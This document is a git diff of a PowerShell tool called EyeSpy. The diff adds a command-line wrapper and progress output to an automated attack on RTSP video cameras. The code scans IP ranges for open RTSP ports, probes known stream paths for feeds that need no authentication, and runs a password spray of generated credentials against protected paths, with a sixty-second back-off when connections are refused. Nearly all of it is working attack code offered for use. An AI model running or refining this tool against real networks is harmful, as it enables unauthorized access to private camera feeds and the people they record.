@@ -1,3 +1,80 @@
+function EyeSpy {
+    [CmdletBinding(DefaultParameterSetName = 'Default')]
+    Param(
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Search,
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$PathScan,
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$AuthAttack,
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [String]$Auto,
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [Switch]$Help
+
+    )
+
+    if ($Help) {
+
+        $HelpOutput = @("
+[ Help ] ================================================
+
+                    EyeSpy 
+                    by: Miiden
+
+=========================================================
+ 
+ Example Usage:
+
+ EyeSpy -Search 192.168.0.1/24
+
+ EyeSpy -PathScan 192.168.0.123
+
+ EyeSpy -AuthAttack 192.168.0.234
+
+ Eyespy -Auto 192.168.0.1/24
+
+=========================================================
+")
+
+        $HelpOutput | Write-Output
+        return
+
+    }
+
+    $Banner = @("
+=========================================================
+                
+=========================================================
+         _______             _______             
+        |    ___.--.--.-----|     __.-----.--.--.
+        |    ___|  |  |  -__|__     |  _  |  |  |
+        |_______|___  |_____|_______|   __|___  |
+                |_____|             |__|  |_____|   
+                                
+=========================================================
+                By: Miiden
+=========================================================
+    ")
+
+    if (!$Search -and !$Auto -and !$PathScan -and !$AuthAttack) {
+    
+        Write-Host
+        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
+        Write-Host "You must provide either -Scan or -FullAuto"
+    
+        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
+        Write-Host "Run ""EyeSpy -Help"" for command line usage"
+        Write-Host
+    
+        return
+    
+    }
+
+$Banner
+
+
+
 function Get-IpRange {
     [CmdletBinding(ConfirmImpact = 'None')]
     Param(
@@ -62,8 +139,13 @@ function Get-OpenRTSPPorts {
         [Parameter(Mandatory, ValueFromPipeline)]
         [string[]]$IPAddress
     )
-
-    process {
+    
+    begin {
+        
+        Write-Host "Checking for IP's with Open RTSP Ports`:`r`n"
+    
+    } process {
+        
         foreach ($ip in $IPAddress) {
             $openPorts = @()
             $ports = 554, 8554, 5554
@@ -71,14 +153,17 @@ function Get-OpenRTSPPorts {
             foreach ($port in $ports) {
                 try {
                     $tcpClient = New-Object System.Net.Sockets.TcpClient
-                    $tcpClient.SendTimeout = 200  # Set a timeout of 1 second
-                    $tcpClient.ReceiveTimeout = 200
-                    $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null)
-                    $success = $awaitResult.AsyncWaitHandle.WaitOne(1000, $false)
+                    $tcpClient.SendTimeout = 200  # Set a send timeout
+                    $tcpClient.ReceiveTimeout = 200 # Set a receive timeout
+                    $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null) # Begin the Async Connection
+                    $success = $awaitResult.AsyncWaitHandle.WaitOne(250, $false)
 
                     if ($success) {
                         $tcpClient.EndConnect($awaitResult)
                         if ($tcpClient.Connected) {
+                            Write-Host -NoNewline -ForegroundColor Green "[+]"
+                            Write-Host -NoNewline  " Open`: "
+                            Write-Host -ForegroundColor Green "$ip`:$port"
                             $openPorts += $port
                             $tcpClient.Close()
                         }
@@ -103,8 +188,12 @@ function Get-OpenRTSPPorts {
                     }
                 }
             }
-        }
-    }   
+        }  
+    } end {
+    
+    Write-Host "`r`n=========================================================`r`n"
+    
+    }
 }
 
 function Get-ValidRTSPPaths {
@@ -142,6 +231,9 @@ function Get-ValidRTSPPaths {
         "videoMain", "videoinput_1/h264_1/media.stm", "videostream.asf", "vis", "wfov"
     )
     $authRequiredPaths = @()
+    
+    Write-Host "=========================================================`r`n"
+    Write-Host "Checking for valid RTSP Paths:`r`n"
 
     foreach ($openPort in $OpenPorts) {
         $ip = $openPort.IPAddress
@@ -169,8 +261,11 @@ function Get-ValidRTSPPaths {
                 $statusLine = $reader.ReadLine()
 
                 if ($statusLine -match 'RTSP/1.0 200 OK') {
-                    Write-Host "$ip`:$port/$path does not require authentication"
+                    Write-Host -NoNewline -ForegroundColor Green "[+]"
+                    Write-Host -NoNewline " No Auth Required`: "
+                    Write-Host -ForegroundColor Green "$ip`:$port/$path"
                     $validPathFound = $true
+
                 }
                 elseif ($statusLine -match 'RTSP/1.0 401 Unauthorized' -or $statusLine -match 'RTSP/1.0 403 Forbidden') {
                     $authRequiredPaths += [PSCustomObject]@{
@@ -190,7 +285,7 @@ function Get-ValidRTSPPaths {
             }
         }
     }
-
+    Write-Host "`r`n=========================================================`r`n"
     return $authRequiredPaths
 }
 
@@ -220,9 +315,6 @@ function GenerateCreds {
         }              
     }
 
-    #Write-Host -NoNewline -ForegroundColor Green "[+] "
-    #Write-Host -NoNewline "Creds Total: "
-    #Write-Host -ForegroundColor Green $authString.Count
     return $authString
 }
 
@@ -239,11 +331,15 @@ function Get-ValidRTSPCredential {
         [string[]]$Credentials
     )
 
+    Write-Host "=========================================================`r`n"
+    Write-Host "Beginning Password Spray:`r`n"
+
     foreach ($cred in $Credentials) {
         $validCred = Test-RTSPAuth -IP $IP -Port $Port -Path $Path -Credential $cred
         if ($validCred) {
             return $validCred
         }
+   
     }
 
     return $null
@@ -298,10 +394,12 @@ function Test-RTSPAuth {
         }
     }
     catch [System.Net.Sockets.SocketException] {
-        Write-Warning "Connection refused by $IP`:$Port"
+        Write-Warning "Connection refused by $IP`:$Port Waiting 60s before continuing."
+        Start-Sleep -Seconds 60
     }
     catch {
-        Write-Warning "An error occurred: $_"
+       # Error catch for debugging, usually non url compliant path.
+       # Write-Warning "An error occurred: $_"
     }
     finally {
         if ($tcpClient.Connected) {
@@ -312,8 +410,14 @@ function Test-RTSPAuth {
     return $null
 }
 
-function RunTheAttack {
-    $ipRange = Get-IpRange -Target '192.168.0.219'
+function FullAuto {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory)]
+        [string]$Targets
+        )
+
+    $ipRange = Get-IpRange -Target $Targets
     $openPorts = Get-OpenRTSPPorts -IPAddress $ipRange
     $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $openPorts
     $credentials = GenerateCreds
@@ -338,14 +442,12 @@ function RunTheAttack {
         }
     }
     return $validCredentials
+   
+}
+
+if ($auto){
+    FullAuto -Targets $auto
 }
 
 
-
-# Main Function Block
-function Main {
-    RunTheAttack
 }
-
-# Call Main function
-Main
